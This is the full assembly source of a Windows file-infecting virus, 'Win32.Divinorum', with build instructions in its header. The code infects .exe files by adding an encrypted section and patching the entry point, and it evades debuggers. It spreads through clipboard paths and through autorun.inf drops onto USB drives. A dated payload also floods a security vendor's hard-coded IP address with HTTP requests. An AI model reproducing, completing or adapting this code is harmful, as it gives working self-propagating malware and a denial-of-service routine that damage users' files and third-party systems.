;Virus name  :Divinorum (Final Release)
;Coded by    :Berniee(aka fakedminded)-------EOF.PROJECT
;Date        :05/10/2007(1st release) ,01/01/08(Final release)
;Method.ofInf:Appending by adding new section
;EPO         :overwriting the first bytes with decrypting loop
;Polymorphism: No
;Worming     :Usb Flash disk dropping 
;Description :The virus is an appender type of virii,infects all files in the  current directory
;             goes up dir three times,and then loops in a clpboard capture and flash worming func
;             the virus payloads every 28th of anymonth a message with f-secure.com DoS
;             The virus rename the infected victim sections into UPX(x)! 
;             First run the virus only infects a "sample.exe" 
;             MSIL PE file will be excluded in the infection.
;             
;             The virus is not intended to hurt anyone so dont fuck people with it
;

;Notes       :This is not the same copy the AVers has informed of.
;To build it either use PEWRSEC tool after assembling the file
;or use the following commands to assemble
;ml /c /Cp /coff divinorum.asm
;link /subsystem:windows /section:.text,wre divinorum.obj
            
;For any bugs contact me thru: fakedminded[ate]cooltoad[dont]com
;http://ass-koder.de.vu or http://eof-project.net ::--further info

.486     
 
.model flat,stdcall 
option casemap:none 

include \masm32\include\windows.inc


include equals.inc
vir_size=offset end__ -offset start
_sub =offset @4-offset start
intiative equ <mov eax,[ebp+offset stack_mem]>
.code
start:
    call @f                 ;Start of antidebugging/delta offset routine
    jmp get_delta
    @@:
    assume fs:nothing
    mov eax,[esp]
    push eax
    push fs:[0]
    mov fs:[0],esp
    xor eax,eax
    mov eax,[eax]
    ret
    get_delta:
    mov eax,[esp+12]       
    mov esp,[eax+184+12]   
    pop fs:[0]
    pop edx
    pop ebp
    sub ebp,offset @b
    add ebp,2h
    or ebp,ebp
    jz @4
    _enc:
    jmp @f
    decrypt_value dd 0ffffffffh     ;every new breed changeable value
    sub_key db 0,0
    @@:
    mov edi,esp                     ;---------------------------
    add edi,28h                     ;                           \  
    mov ebx,edi                     ;                            |
    lea esi,[ebp+offset decryptor]  ;                            |
    mov ecx,size_d
    rep movsb                       ;                           Decr
                                    ;                           ypti
                                    ;                           ng R
    @@:                             ;                           outi
    xor eax,eax                     ;                           e
    mov eax,[ebx]                   ;                           Inst
                                    ;                           alle
    xchg ah,al                      ;                           d in
    ror eax,16                      ;                           Stac
    xchg ah,al                      ;                           k bl
    ror eax,16                      ;                           ock.
    mov dword ptr [ebx],eax
    add ebx,4
    add ecx,4
    cmp ecx,size_d
    jae @f
    lea edx,[ebp+offset @b]
    push edx
    ret

    @@:
    lea esi,[ebp+offset @4]
    mov ecx,vir_size- _sub+4
    jmp @f
    decryptor db 0F9h,83h, 7Eh,00h ,31h,0eh ,03h,06h ,0D1h,0c2h ,83h,0c8h ,08h,0c6h ,0E9h,83h ,0EBh,08h, 0c3h,0EDh
    size_d = $-decryptor
    @@:
    xor edx,edx                      ;                             |
    mov eax,dword ptr [ebp+offset decrypt_value];                  |
    mov dx,word ptr [ebp+offset sub_key]
    sub ebx,size_d                   ;                             /
    call ebx                         ;-----------------------------                                
    
    @4:              
    jmp @f
    CopyLeft db "Win32.Divinorum",13,10,"Code By Fakedminded/EOF-Project",13,10,"Mikko cut ur ponytail!",0
    cur_ep dd 0
    victims db "*.exe",0
    HFile dd 0
    prev_entry dd 0
    image_base dd 00400000h ;only for the first run ;)
    buffer_clpboard dd 0
    w32fdata WIN32_FIND_DATA<0>
    @@:
    xor ebx,ebx
    mov ebx,esp
    mov ecx,esp
    sub ecx,1000h
    mov dword ptr [ebp+offset stack_mem],ecx

    call get_kernel
    call find_main_api
    sub [ebp+offset decrypt_value],0
    mov ecx,0ffffh
    call rnd_
    push eax
    mov ecx,0ffffh
    call rnd_
    pop ecx
    ror eax,16
    xor eax,ecx
    cmp eax,0
    jg @f
    not eax
    mov [ebp+offset decrypt_value],eax
    push eax
    mov ecx,0ffffh
    call rnd_
    push eax
    mov ecx,0ffffh
    call rnd_
    pop edx
    xor eax,edx
    mov word ptr[ebp+sub_key],ax
    @@:
    or ebp,ebp
    jz @f
    mov edi,[ebp+offset prev_entry]
    add edi,[ebp+image_base]
    push edi
    lea esi,[ebp+offset original_bytes]
    mov ecx,(size666+8)
    rep movsb

    pop edi
    or ebp,ebp
    jz @f
    mov edx,esp
    sub edx,24
    push edx
    xor eax,eax
    push eax
    push eax
    push edi
    push eax
    push eax
    intiative
    call ACreateThread
    @@:

    mov eax,[stack_mem+ebp]
    mov eax,AGetProcAddress
    mov eax,[eax]
    cmp eax,000200C8h
    jz exit
    call paytime  ;---> a postponed project
    or ebp,ebp
    jnz x_n_run
    call @f
    db "sample.exe",0    ;first run infect sample.exe
    @@:
    pop edx
    call adding_section
    jmp _1st_run
    x_n_run:
    call dir_up       ;infect directories by going up 3 times
    call capture_clpboard 
    exit1:
    @@:
    exit_32:
    push -1
    intiative
    call ASleep
    _1st_run:
    intiative
    call AExitProcess
    exit:
    ret



;//////////////////dir up 3 times
dir_up:
    push 256
    push 0
    intiative
    call AGlobalAlloc
    mov edx,eax
    push eax
    push edx
    push 256
    intiative
    call AGetCurrentDirectoryA
    mov edx,[esp]
    cmp word ptr [edx+3],"NIW"
    jne @f
    cmp word ptr [edx+3],"niw"
    jne @f
    pop edx
    ret
    @@:


    mov ecx,3
    bad_luck:
    push ecx
    call nfkt_dir

    call @f
    db "..",0
    @@:
    intiative 
    call ASetCurrentDirectoryA
    pop ecx
    loop bad_luck
    intiative
    call ASetCurrentDirectoryA
    ret


;//////////////////here it will check tha infected proggy has the capability of net connection in its apis


check_sock:
    mov esi,[ebp+image_base]
    add esi,[esi+3ch]
    mov ecx,[esi+84h]
    mov esi,[esi+80h]
    or esi,esi
    jz failed_
    add esi,[ebp+image_base]
    
    @@:
    mov edi,[esi+0ch]
    add edi,[ebp+image_base]
    cmp dword ptr[edi],'COSW'
    jz @f
    cmp dword ptr[edi],'cosw'
    jz @f
    cmp dword ptr[edi],'_2sw'
    jz @f
    cmp dword ptr[edi],'_2SW'
    jz @f
    add esi,14h
    sub ecx,13h
    loop @b
    failed_:
    xor eax,eax
    ret
    @@:
    mov eax,-1
    ret

;///////////////////nfkt directory procedure////////
nfkt_dir:
    lea eax,[ebp+offset w32fdata]
    push eax
    lea eax,[ebp+offset victims]
    push eax
    mov eax,[ebp+stack_mem]
    call AFindFirstFileA
    cmp eax,INVALID_HANDLE_VALUE
    jz exit42
    mov [ebp+offset HFile],eax
    or eax,eax
    jz exit42
    lea edx,[ebp+offset w32fdata.cFileName]
    call adding_section
    @find:
    mov ecx,overall_size
    call hold_stack
    lea eax,[ebp+offset w32fdata]
    push eax
    push [ebp+offset HFile]
    intiative
    call AFindNextFileA
    mov ecx,overall_size
    call return_stack
    mov eax,fs:[18h]  ;replacing GetLastError(),since it bugged me on XP!
    mov eax,[eax+34h]
    cmp eax,ERROR_NO_MORE_FILES
    jz exit52
    lea edx,[ebp+offset w32fdata.cFileName]
    call adding_section
    jmp @find
    exit52:
    push [ebp+offset HFile]
    intiative;mov eax,[ebp+offset stack_mem]
    call AFindClose
    exit42:
    ret

;///////////////////getting kernel base/////////////
get_kernel:
    jmp this_code
    kernel_base dd 0
    this_code:
    mov ecx,[esp+4]
    loop_find_kernel:
    xor edx,edx
    dec ecx
    mov dx,[ecx+3ch]
    test dx,0f800h
    jnz loop_find_kernel
    cmp ecx,[ecx+edx+34h]
    jnz loop_find_kernel
    cmp word ptr [ecx],"ZM"
    jne loop_find_kernel
    mov dword ptr [ebp+offset kernel_base],ecx
    lrrt:
    ret
;/////////////////end getting kernel base///////////////

find_main_api:
    jmp finder_data
k32_crc:
    CreateFileAF            	 dd 0553b5c78h
    CloseHandleF	             dd 0b09315f4h
    WriteFileF                	 dd 0cce95612h
    ReadFileF	                   dd 095c03d0h
    GetFileSizeF             	 dd 0a7fb4165h
    GlobalAllocF	             dd 07fbc7431h
    SetFilePointerF	             dd 0efc7ea74h
    GetProcAddressF	             dd 0c97c1fffh
    GetVersionExAF	             dd 0df87764ah
    GetDateFormatAF	             dd 03b15c34bh
    SleepF	                   dd 0cef2eda8h
    FindFirstFileAF	             dd 0c9ebd5ceh
    FindNextFileAF      	       dd 075272948h
    FindCloseF          	       dd 0d82bf69ah
    GetLastErrorF       	       dd 0d2e536b7h
    ExitProcessF             	 dd 0251097cch
    LoadLibraryAF       	       dd 03fc1bd8dh
    FreeLibraryF        	       dd 0da68238fh
    ExpandEnvironmentStringsAF	 dd 0a6bab89ch
    GetModuleHandleAF	             dd 0b1866570h
    GetModuleFileNameAF	       dd 08bff7a0h
    CopyFileAF	                   dd 0199dc99h
    GetCurrentDirectoryAF	       dd 0c79dc4e3h
    SetCurrentDirectoryAF	       dd 069b6849fh
    GetFileAttributesAF	       dd 030601c1ch
    GetTickCountF           	 dd 05b4219f8h
    CreateThreadF	             dd 0906a06b0h
    IsDebuggerPresentF      	 dd 08436f795h
    CreateMutexAF           	 dd 0d9ac2453h
    GetLogicalDriveStringsAF	 dd 054216660h
    GetDriveTypeAF	             dd 0f6a56750h
    VirtualProtectF	             dd 010066f2fh
    GetEnvironmentVariableAF	 dd 02f87d308h
    CreateProcessAF	             dd 0a851d916h
    WaitForSingleObjectF	       dd 0e058bb45h
                                   dd 0

k32_crc_size = $-k32_crc-4

ws_32_crc:
    WSACleanupF         	 dd 08e3398bch
    WSAStartupF	             dd 0a0f5fc93h
    WSASocketAF	             dd 0cb14bd82h
    htonsF              	 dd 0fac416e8h
    htonlF              	 dd 077cc1b1dh
    connectF	             dd 074cff91fh
    acceptF	                   dd 0b320ed34h
    listenF             	 dd 0c22467fdh
    recvF	                   dd 059d852adh
    sendF	                   dd 0a7733acdh
    bindF	                   dd 046ccf353h
    inet_addrF          	 dd 05308a87eh
                       dd 0            

ws_32_crc_size = $-ws_32_crc-4

shell32:
    DragQueryFileAF	 dd 0732cfac6h
    dd 0
shell32_size = $-shell32-4

user32:
    OpenClipboardF	 dd 0b44ddfcah
    CloseClipboardF	 dd 099c1926ch
    GetClipboardDataF	 dd 01dcbd147h
    MessageBoxAF	 dd 0572d5d8eh
    dd 0
user32_size =$-user32-4
overall_size=user32_size+shell32_size+ws_32_crc_size+k32_crc_size
    h_drop dd 0
    PE_offset dd 0
    Export_address dd 0
    Export_size dd 0
    Current_kern dd 0
    function_no dd 0
    function_addr dd 0
    function_ord dd 0
    function_name dd 0
    base_ord dd 0
    dll_base dd 0
    stack_mem dd 0
    crc_function dd 0
    stack_pointer dd 0
    old_mem_protect dd 0
    saved_stack dd 0
finder_data:
    lea edx,[ebp+offset k32_crc]
    mov edi,[ebp+offset kernel_base]
    mov ecx,[ebp+offset stack_mem]
    call find_apiz
    push (ws_32_crc_size+k32_crc_size+user32_size+shell32_size+300)
    push 0
    intiative
    call AGlobalAlloc
    mov [ebp+offset saved_stack],eax
    mov ecx,k32_crc_size
    mov edi,eax
    mov esi,[ebp+offset stack_mem]
    call save_stack ;LoadLibrary() fornicate the stack!
    call @f                 ;finding  user32_apiz:--test
    db "ws2_32.dll",0
    @@:
    mov eax,[ebp+stack_mem]
    call ALoadLibraryA
    push eax
    mov ecx,k32_crc_size
    mov edi,[ebp+offset stack_mem]
    mov esi,[ebp+offset saved_stack]
    call save_stack
    pop eax
    lea edx,[ebp+offset ws_32_crc]
    mov edi,eax
    mov ecx,[ebp+offset stack_mem]
    add ecx,k32_crc_size
    call find_apiz
    mov ecx,k32_crc_size+ws_32_crc_size
    call hold_stack ;LoadLibrary() fornicate the stack!
    call @f                
    db "shell32.dll",0
    @@:
    mov eax,[ebp+stack_mem]
    call ALoadLibraryA
    push eax
    mov ecx,k32_crc_size+ws_32_crc_size
    call return_stack
    pop eax
    lea edx,[ebp+offset shell32]
    mov edi,eax
    mov ecx,[ebp+offset stack_mem]
    add ecx,k32_crc_size+ws_32_crc_size
    call find_apiz
    
    mov ecx,k32_crc_size+ws_32_crc_size+shell32_size
    call hold_stack ;LoadLibrary() fornicate the stack!
    
    call @f                
    db "user32.dll",0
    @@:
    mov eax,[ebp+stack_mem]
    call ALoadLibraryA
    push eax
    mov ecx,k32_crc_size+ws_32_crc_size+shell32_size
    call return_stack
    pop eax
    lea edx,[ebp+offset user32]
    mov edi,eax
    mov ecx,[ebp+offset stack_mem]
    add ecx,k32_crc_size+ws_32_crc_size+shell32_size
    call find_apiz
    ret

save_stack:
    @@:
    lodsd
    stosd
    sub ecx,3
    loop @b
    ret


;------------------------------------------------------------------------;
;                       finding apis of   different kinds of modules     ;
;________________________________________________________________________;
;edx=pointer to crc functions,edi=address of the module,ecx=offset from stack_mem
find_apiz: 
    mov [ebp+offset stack_pointer],ecx
    mov [ebp+crc_function],edx
    mov [ebp+offset dll_base],edi
    add edi,[edi+3ch]      ;just checking
    cmp word ptr [edi],"EP"
    jne exit
    mov dword ptr [ebp+offset PE_offset],edi
    mov eax,[edi+78h]      ;export table rva
    push eax
    mov eax,[edi+7ch]      ;export table size 
    mov [ebp+offset Export_size],eax
    pop eax
    mov [ebp+offset Export_address],eax
    add eax,[ebp+offset dll_base]
    mov edx,[eax+16]               ;  ordinal base
    add edx,[ebp+offset dll_base]  
    mov [ebp+offset base_ord],edx
    mov edx,[eax+24]               ;no. of exported functions
    mov [ebp+offset function_no],edx 
    mov edx,[eax+28]              ;rva of exported functions
    add edx,[ebp+offset dll_base]
    mov [ebp+offset function_addr],edx 
    mov edx,[eax+32]              ; rva of exported function name
    add edx,[ebp+offset dll_base]
    mov [ebp+offset function_name],edx
    mov edx,[eax+36]  ;rva for name ordinal
    add edx,[ebp+offset dll_base]
    mov [ebp+offset function_ord],edx
    xor edx,edx 
    xor eax,eax
    xor ecx,ecx
    mov esi,[ebp+crc_function]
    loop_beauty:
    lodsd
    cmp eax,0h
    je end_serch_api
    xchg eax,ebx
    push esi
    push ecx
    xor ecx,ecx
    mov esi,[ebp+offset function_name] 
    @@:
    lodsd
    add eax,[ebp+offset dll_base]
    push ecx
    push esi
    push ebx
    xchg eax,esi
    call size_string
    call crc_
    pop ebx
    pop esi
    pop ecx
    cmp ebx,eax
    jz Got_it
    inc ecx
    cmp ecx,[ebp+offset function_no]
    jna @b
    Got_it:
    shl ecx,1
    mov eax,[ebp+offset function_ord]
    add eax,ecx
    xor ecx,ecx
    mov cx,word ptr [eax]
    shl ecx,2
    mov eax,[ebp+offset function_addr]
    add eax,ecx
    mov eax,[eax]
    add eax,[ebp+offset dll_base]
    pop ecx
    mov ebx,ecx
    add ebx,[ebp+offset stack_pointer]; [ebp+stack_mem]
    mov [ebx],eax
    add ecx,4
    pop esi
    jmp loop_beauty;mov [ebp+offset AGetProcAddressF],eax
    end_serch_api:
    ret

    exit_finder:
    mov eax,0
    ret

vir_size=offset end__ -offset start
_sub =offset @4-offset start

decrypt666:
    mov ebp,esp
    sldt word ptr [ebx+8]
    xor edx,edx
    mov edx,dword ptr [ebx+8]
    or edx,edx
    jz lick_69
    mov ebx,_sub
    @@:
    sub dword ptr [eax],3
    add eax,4
    sub ebx,4
    cmp ebx,0
    jg @b
    add esp,4
    jmp dword ptr [ebp]
;    call @f
;    push 0c3h
;    @@:
;    pop edx
;    jmp $-5
;    ret
    lick_69:
    ret

size666 equ  $ - decrypt666
;/////////////////////adding new section at the end of file
;///////////////////
adding_section:   ;file infection procedure by adding new section
    jmp code_
    v_handle dd 0
    v_size dd 0
    v_mem dd 0
    sec_align dd 0
    file_align dd 0
    add_ed dd 0
    bwr dd 0
    cur_pe dd 0
    v_size_aligned dd 0
    virtual_address dd 0
    physical_address dd 0
    vir_enc_mem dd 0
    lstsec_physical_offset dd 0
    lstsec_virtual_address dd 0
    ep_in_sec dd 0
    original_bytes db (size666+8) dup(0)
    delta_section dd 0
    code_:
    push 0
    push 0
    push 3
    push 0
    push FILE_SHARE_READ or FILE_SHARE_WRITE
    push 40000000h or 80000000h
    mov eax,edx
    push eax
    mov eax,dword ptr[ebp+stack_mem]
    call ACreateFileA
    mov dword ptr [ebp+offset v_handle],eax
    push 0
    push dword ptr [ebp+offset v_handle]
    mov eax,dword ptr[ebp+stack_mem]
    call  AGetFileSize
    mov dword ptr [ebp+offset v_size],eax
    push dword ptr [ebp+offset v_size]
    push 0
    mov eax,dword ptr[ebp+stack_mem]
    call dword ptr AGlobalAlloc
    or eax,eax
    jz err_sec
    mov dword ptr [ebp+offset v_mem],eax
    push 0
    mov eax,offset bwr
    add eax,ebp
    push eax
    push dword ptr [ebp+offset v_size]
    push dword ptr [ebp+offset v_mem]
    push dword ptr [ebp+offset v_handle]
    mov eax,dword ptr[ebp+stack_mem]
    call AReadFile     ;--->completed reading the file to the v_mem
    mov eax, dword ptr [ebp+offset v_mem]    ;start to check for MSIL shit
    mov ecx, dword ptr [ebp+offset v_size]
    @@:
    cmp word ptr [eax],"ocsm"
    je err_sec
    inc eax
    loop @b

    mov edx,dword ptr [ebp+offset v_mem]
    cmp word ptr [edx],'ZM'
    jne err_sec
    add edx,dword ptr [edx+3ch]                ;---->I've got to PE!e
    cmp word ptr [edx],'EP'
    jne err_sec
    mov eax, dword ptr [edx+52]              
    mov dword ptr [ebp+offset image_base],eax  ;---->Image base save it 
    mov eax, dword ptr [edx+40]
    mov dword ptr [ebp+offset prev_entry],eax  ;---->so as the entry point
    xor ecx,ecx
    mov cx,word ptr [edx+6h]
    inc word ptr [edx+6h]            ;sec. numbers=old+1(our new section)
    mov eax,dword ptr [edx+60]
    mov [ebp+offset file_align],eax
    mov eax,dword ptr [edx+56]      ;-->section alignment usually 1000
    mov [ebp+offset sec_align],eax
    mov ebx,eax
    mov eax,vir_size                ;---->managing the image size
    call align__
    add dword ptr [edx+80],eax     
    push edx
    xor eax,eax
    mov ax,word ptr [edx+14h]       ;--->getting the optional header size
    add ax,24                       ;--->adding 24(offset of optional header from PE) to get into sections' headers 
    add edx,eax
    mov dword ptr [ebp+offset cur_pe],edx ;saving 'pe' offset
    call change_section_names
    mov eax,[edx+20]
    mov dword ptr [ebp+lstsec_physical_offset],eax
    call find_1stsec
    mov dword ptr [eax+36],0c0000040h
    mov dword ptr [ebp+offset ep_in_sec],eax
    xor eax,eax
    xor edx,edx
    mov eax,28h                         ;--->getting the last section's header
    mul cx
    mov edx,[ebp+offset cur_pe]         
    add edx,eax
    sub edx,28h                         ;substtract 28h (sec. header size) to get the beginning of the last header data
    mov eax,dword ptr [edx+0ch] ;--->virtual address of previous section
    add eax,dword ptr [edx+08h] ;--->virtual size of previous section
    cmp eax,dword ptr [edx+0ch] ;--->detect if virtual size is zero?!!
    jnz @f
    pop ecx
    jmp err_sec
    @@:
    mov ebx,[ebp+offset sec_align] ;--->align them for the new added section virtual address
    call align__
    mov dword ptr [ebp+offset virtual_address],eax ;--->of the new section
    mov eax,dword ptr[edx+20]  ;----->pointer of the physical raw data in prev. section
    add eax,dword ptr[edx+16]  ;----->physical size of prev. section
    mov ebx,[ebp+offset file_align]  ;--->align according to file aligner
    call align__
    mov dword ptr [ebp+offset physical_address],eax
    continue__:
    add edx,28h          ;--->going to add our section
    mov ecx,28h
    loop_grant:           ;--->checking out if there is any space there for adding our section
    cmp dword ptr [edx],0 ;--alot of ecxeptions
    jne err_all
    inc edx
    loop loop_grant
    sub edx,50h
    add edx,28h
    mov ebx,'0XPU'
    mov dword ptr [edx],ebx   ;------>section's name(randomized)
    mov eax,vir_size
    mov ebx,[ebp+offset file_align]   ;---->section's v. size
    call align__
    mov dword ptr [edx+8],eax    ;-------> section's v. size
    push dword ptr [ebp+offset virtual_address]  ;-----> section v.address
    pop dword ptr [edx+12]
    mov eax,[edx+12]                         
    mov dword ptr [ebp+offset add_ed],eax
    mov dword ptr [edx+16],vir_size   ;----->raw size of the new section
    push dword ptr [ebp+offset physical_address] ;---->physical address of our new section
    pop dword ptr [edx+20]
    mov dword ptr [edx+36],0c0000040h  ;read and write characteristics of the new section
    add edx,28h
    fill_gap:
    cmp byte ptr[edx],0
    jnz @f
    mov byte ptr [edx],-1
    inc edx
    loop fill_gap
    @@:
    pop edx                     ;--returning our old pointer to pe
    mov eax,dword ptr [ebp+offset physical_address] ;now after the popping,
                                                    ;checking if there is some extra in the end 

    add eax,10000                                   ;let go some situation ;)
    cmp [ebp+offset v_size],eax           
    jg err_sec
    add dword ptr [edx+01ch],vir_size
    push FILE_BEGIN
    push 0
    push 0
    push dword ptr [ebp+offset v_handle]
    intiative
    call ASetFilePointer

    push 0
    mov eax,offset bwr
    add eax,ebp
    push eax
    push dword ptr [ebp+offset v_size]
    push dword ptr [ebp+offset v_mem]
    push dword ptr [ebp+offset v_handle]
    intiative
    call  AWriteFile                  ;writing back victim's body

    mov eax,[ebp+offset add_ed] 
    mov eax,[ebp+offset ep_in_sec]
    push eax
    mov eax,[eax+0ch]
    mov ebx,[ebp+prev_entry]
    sub ebx,eax
    mov [ebp+delta_section],ebx
    pop eax
    mov eax,[eax+20]
    add eax,[ebp+delta_section]
    pusha
    push FILE_BEGIN
    push 0
    push eax
    push dword ptr [ebp+offset v_handle]
    mov eax,dword ptr[ebp+stack_mem]
    call ASetFilePointer
    popa
    mov esi,[ebp+offset v_mem]            ;epo routine
    add esi,eax
    mov ecx,(size666+8)
    push esi
    lea edi,[ebp+offset original_bytes]
    rep movsb
    pop esi
    mov byte ptr [esi],0b8h
    mov eax, [ebp+offset add_ed]
    add eax,[ebp+image_base]
    mov dword ptr[esi+1],eax
    mov byte ptr [esi+5],50h
    mov edi,esi
    push esi
    add edi,6
    lea esi,[ebp+offset decrypt666]
    mov ecx,size666
    rep movsb
    pop esi
    push 0
    mov eax,offset bwr
    add eax,ebp
    push eax
    push (size666+8)
    push esi
    push dword ptr [ebp+offset v_handle]
    intiative
    call  AWriteFile                  ;writing back victim's body
    push FILE_BEGIN
    push 0
    push 0
    push dword ptr [ebp+offset v_handle]
    intiative
    call ASetFilePointer
    push FILE_END
    push 0
    push 0
    push dword ptr [ebp+offset v_handle]
    intiative
    call ASetFilePointer
    push vir_size
    push 0
    intiative
    call AGlobalAlloc
    mov dword ptr [ebp+offset vir_enc_mem],eax
    mov edi,dword ptr [ebp+offset vir_enc_mem]
    mov esi,offset start
    add esi,ebp
    mov ecx,vir_size
    rep movsb
    mov edi,dword ptr [ebp+offset vir_enc_mem]
    mov esi,edi
    mov ecx,_sub
    @@:
    add dword ptr [esi],3
    add esi,4
    sub ecx,4
    cmp ecx,0
    jg @b 
    add edi,_sub
    push edx
    xor eax,eax
    mov eax,dword ptr[ebp+offset decrypt_value]
    xor edx,edx
    mov dx,word ptr [ebp+offset sub_key]
    mov ecx,vir_size- _sub
    @@:
    xor dword  ptr [edi],eax
    add eax,edx
    ror eax,1h
    add edi,8
    sub ecx,8
    cmp ecx,0
    jg @b
    pop edx
    push 0
    mov eax,offset bwr
    add eax,ebp
    push eax
    push vir_size
    push dword ptr [ebp+offset vir_enc_mem]
    push dword ptr [ebp+offset v_handle]
    intiative
    call AWriteFile ;----> write our virus to the end of file


    push dword ptr [ebp+offset v_handle]
    intiative

    call ACloseHandle
    ret
    err_sec:
    push dword ptr [ebp+offset v_handle]
    intiative
    call ACloseHandle
    ret
    err_all:
    push dword ptr [ebp+offset v_handle]
    intiative
    call ACloseHandle
    pop edx
    ret
    find_1stsec:
    push ebx
    push edx
    mov ebx,dword ptr [ebp+prev_entry]
    @ddd:
    xor eax,eax
    mov eax,[edx+0ch] ;V.Address compare with the entry point!
    cmp eax,ebx
    jle @f
    add edx,28h
    jmp @ddd
    @@:
    add eax,[edx+10h];size of raw data
    cmp eax,ebx
    jg found_pointer
    add edx,28h
    jmp @ddd
    found_pointer:
    xchg eax,edx
    pop edx
    pop ebx
    findsectL:
    ret

change_section_names:
    push edx
    push ecx
    xor eax,eax
    mov eax,'1'
    @@:
    mov dword ptr[edx],'XPU'
    mov dword ptr[edx+3],eax
    inc eax
    add edx,40
    loop @b
    pop ecx
    pop edx
    ret

align__:          
    push edx
    xor edx, edx
    div ebx
    or edx, edx
    jz no_round_up
    inc eax
    no_round_up:
    mul ebx
    pop edx
    ret




paytime:   ;a dos attack on certain ips..
    jmp @f
    buftime dd 0
    @@:
    push 100
    push 0
    intiative
    call AGlobalAlloc
    mov [ebp+buftime],eax
    push 256
    push [ebp+buftime]
    call @f
    db "dd",0
    @@:
    xor eax,eax
    push eax
    push eax
    push eax
    intiative
    call AGetDateFormatA
    mov eax,[ebp+offset buftime]
    cmp word ptr [eax],'82'    
    jne @f
    xor eax,eax
    push eax
    push [ebp+offset buftime]
    lea edx,[ebp+offset CopyLeft]
    push edx
    push eax
    intiative
    call AMessageBoxA
    call payload_
    @@:
    ret

payload_:   
    jmp @f
    ip_victime db "193.110.109.55",0
    header db "GET / HTTP/1.1",13,10,"Host:www.f-secure.com",13,10,"Connection:Keep-Alive",13,10,13,10,0
    size_header = $-header
    @@:

    mov ecx,sizeof sockaddr_in
    lea esi,[ebp+sock_addr]
    call zero_mem
    lea eax,[ebp+offset ws]
    push eax
    push 001h
    mov eax,[stack_mem+ebp]
    call AWSAStartup
    mov ecx,k32_crc_size+ws_32_crc_size
    call hold_stack 

    xor eax,eax
    push eax
    push eax
    push eax
    push IPPROTO_TCP
    push SOCK_STREAM
    push AF_INET
    intiative
    call AWSASocketA

    cmp eax,INVALID_SOCKET
    jz exit_shell
    mov [ebp+socket_],eax
    mov ecx,k32_crc_size+ws_32_crc_size
    call return_stack
    mov [ebp+sock_addr.sin_family],AF_INET
    push 80
    intiative
    call Ahtons
    mov word ptr [ebp+sock_addr.sin_port],ax
    lea eax,[ebp+offset ip_victime]
    push eax
    intiative
    call Ainet_addr
    mov [ebp+sock_addr.sin_addr.S_un.S_addr],eax
    push sizeof sock_addr
    lea eax,[ebp+offset sock_addr]
    push eax
    push [ebp+offset socket_]
    intiative
    call Aconnect
    @@:
    push 0
    push size_header
    lea eax,[ebp+header]
    push eax
    push [ebp+offset socket_]
    intiative
    call Asend
    push 1000
    intiative
    call ASleep
    loop @b
    ret
    exit_shell:
    ret

    ws WSADATA <0>
    sock_addr sockaddr_in<0>
    socket_ dd 0
    current_dir dd 0

  

capture_clpboard:         ;search for clipboard for any pe files or folders to infect(readonly will not bee infected!)
    push 512
    push 0
    intiative
    call AGlobalAlloc
    mov dword ptr [ebp+offset buffer_clpboard],eax
    push 512
    push 0
    intiative
    call AGlobalAlloc
    mov dword ptr [ebp+offset current_dir],eax
    jmp @f
    buffer_dropper dd 0
    module_name dd 0
    buffer dd 0
    @@:
    push 512
    push 0
    intiative
    call AGlobalAlloc
    mov [ebp+offset buffer],eax
    push 512
    push 0
    intiative
    call AGlobalAlloc
    mov [ebp+offset buffer_dropper],eax
    push 512
    push 0
    intiative
    call AGlobalAlloc
    mov [ebp+offset module_name],eax
    _label1:
    call drop_flash
    push 0
    intiative
    call AOpenClipboard
    push CF_HDROP
    intiative
    call AGetClipboardData
    or eax,eax
    jz _sleepClp
    mov [ebp+offset h_drop],eax
    push 0
    push 0
    push 0FFFFFFFFh
    push eax
    intiative
    call ADragQueryFileA
    or eax,eax
    jz _sleepClp
    mov ecx,eax

    _getFiles:
    push ecx
    push 512
    push [ebp+offset buffer_clpboard]
    dec ecx
    push ecx
    push [ebp+offset h_drop]
    intiative
    call ADragQueryFileA
    push [ebp+offset buffer_clpboard]
    intiative
    call  AGetFileAttributesA
    cmp eax,FILE_ATTRIBUTE_READONLY
    je see_next
    cmp eax,FILE_ATTRIBUTE_DIRECTORY
    je @f
    call conver_2_folder
    @@:
    push [ebp+offset current_dir]
    push 512
    intiative
    call AGetCurrentDirectoryA
    push [ebp+offset buffer_clpboard]
    intiative
    call  ASetCurrentDirectoryA
    call dir_up;nfkt_dir
    push [ebp+offset current_dir]
    intiative
    call ASetCurrentDirectoryA
    jmp see_next
    see_next:
    pop ecx
    call _sleepClp

    _sleepClp:
    intiative
    call ACloseClipboard
    mov esi,[ebp+offset buffer_clpboard]
    mov ecx,512
    call zero_mem
    push 7000
    intiative
    call ASleep
    jmp _label1
    exit_clpboard:
    ret

conver_2_folder:
    mov esi,[ebp+offset buffer_clpboard]
    call size_string
    add esi,ecx
    dec esi
    @@:
    cmp byte ptr[esi],'\'
    je @f
    mov byte ptr[esi],0
    dec esi
    jmp @b
    @@:
    ret



;////////
file_content db "[autorun]",13,10,"open=driver_setup.exe",13,10,0
file_name2 db "autorun.inf",0
file_name db "driver_setup.exe",0

drop_flash:            ;this will drop the infected file into any new attached removavle except floppy drives
    mov ecx,overall_size
    call hold_stack
    push 512
    push [ebp+offset module_name]
    push 0
    intiative
    call AGetModuleFileNameA
    mov ecx,overall_size
    call return_stack
    search_driver:
    push [ebp+offset buffer_dropper]
    push 512
    intiative
    call AGetLogicalDriveStringsA
    mov edx,[ebp+offset buffer_dropper]
    _rumble:
    push edx
    cmp byte ptr [edx],"A"
    je seek_nother
    push edx
    intiative
    call AGetDriveTypeA
    cmp eax,DRIVE_REMOVABLE
    jne seek_nother
    mov esi,[ebp+offset buffer]
    mov ecx,256
    call zero_mem
    mov ecx,overall_size
    call hold_stack
    pop edx
    push edx
    mov esi,edx
    mov edi,[ebp+offset buffer]
    mov ecx,3
    rep movsb
    mov edi,[ebp+offset buffer]
    add edi,3
    mov esi,offset file_name
    add esi,ebp
    mov ecx,sizeof file_name
    rep movsb
    push FALSE
    push [ebp+offset buffer]
    push [ebp+offset module_name]
    intiative
    call ACopyFileA
    mov ecx,overall_size
    call return_stack
    push 100
    intiative
    call ASleep
    pop edx
    push edx
    mov esi,[ebp+offset buffer]
    mov ecx,256
    call zero_mem
    mov esi,edx
    mov edi,[ebp+offset buffer]
    mov ecx,3
    rep movsb
    lea esi,[ebp+offset file_name2]
    mov ecx,sizeof file_name2
    rep movsb
    xor eax,eax
    push eax
    push eax
    push 2
    push eax
    push eax
    push 40000000h
    push [ebp+offset buffer]
    intiative 
    call ACreateFileA
    push eax
    push 0
    mov edx,esp
    push 0
    push edx
    push sizeof file_content
    lea edx,[ebp+offset file_content]
